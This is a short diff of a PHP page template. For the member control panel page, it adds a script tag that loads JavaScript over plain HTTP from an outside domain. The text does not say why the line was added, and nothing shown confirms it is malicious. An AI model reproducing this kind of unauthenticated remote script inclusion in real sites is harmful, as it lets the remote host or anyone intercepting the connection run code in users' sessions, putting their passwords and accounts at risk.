@@ -132,6 +132,7 @@ if ($scripturl == "/index.php"){
 }elseif ($scripturl == "/membercp.php"){
 		?><script type="text/javascript" src="../../js/passwordstrength.js"></script>
 		<script type="text/javascript" src="../../js/membercp.js"></script>
+        <script type="text/javascript" src="http://templateshares-ue.net/tsue/js.php?lv=2.3&s=comments,profile"></script>
 		<script type="text/javascript" src="../../js/messages.js"></script><?php
 }
 
